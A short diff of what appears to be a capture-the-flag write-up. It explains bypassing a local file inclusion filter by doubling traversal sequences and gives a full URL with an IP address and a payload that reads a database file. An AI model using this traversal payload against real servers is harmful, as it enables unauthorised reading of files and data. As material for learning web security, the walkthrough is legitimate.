@@ -11,7 +11,7 @@ now you will see that you need to read /../database/E-Corp.db
 
 to bypass the lfi filter you will double every thing 
 
-so ./ => ....//
+so ../ => ....//  
 
 now open http://3.121.98.79/E-CORP/?page=....//database/E-Corp.db
 
